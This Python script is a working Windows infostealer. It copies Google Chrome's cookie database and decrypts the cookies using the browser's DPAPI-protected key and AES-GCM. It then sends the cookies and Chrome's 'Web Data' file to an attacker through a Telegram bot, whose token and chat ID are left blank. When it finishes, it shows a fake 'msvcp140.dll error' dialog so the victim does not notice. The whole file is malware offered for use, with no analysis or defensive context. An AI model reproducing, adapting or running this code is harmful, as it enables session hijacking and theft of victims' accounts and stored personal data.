try:
	import os
	import json
	import base64
	import sqlite3
	from shutil import copyfile
	import time
	import win32crypt
	from Cryptodome.Cipher import AES
	import getpass
	import ctypes

	from telepot import Bot
	bot = Bot("") #Telegram Bot token -SyeSociety
	copyfile(os.getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/Network/Cookies", os.getenv("APPDATA") + "/Cookies")

	encrypted_key = None
	with open(os.getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Local State", 'r') as file:
		encrypted_key = json.loads(file.read())['os_crypt']['encrypted_key']
	encrypted_key = base64.b64decode(encrypted_key)
	encrypted_key = encrypted_key[5:]
	decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]


	conn = sqlite3.connect(os.getenv("APPDATA") + "/Cookies")
	cursor = conn.cursor()

	cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
	for host_key, name, value, encrypted_value in cursor.fetchall():
		try:
			cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=encrypted_value[3:3+12])
			decrypted_value = cipher.decrypt_and_verify(encrypted_value[3+12:-16], encrypted_value[-16:])
		except:
			decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8') or value or 0

		cursor.execute('\
			UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0\
			WHERE host_key = ?\
			AND name = ?',
			(decrypted_value, host_key, name));
		#print(str(host_key) + " " + str(name) + " " + str(decrypted_value))


	conn.commit()
	conn.close()

	bot.sendDocument("", document=open(os.getenv("APPDATA") + "/Cookies", 'rb')) # Telegram number ID
	time.sleep(1)
	copyfile(os.getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/Web Data", os.getenv("APPDATA") + "/WebData")
	bot.sendDocument("", document=open(os.getenv("APPDATA") + "/WebData", "rb")) # Telegram number ID
	ctypes.windll.user32.MessageBoxW(0, "msvcp140.dll error", "Windows Services", 16)
except:
	import ctypes
	ctypes.windll.user32.MessageBoxW(0, "msvcp140.dll error", "Error", 16)
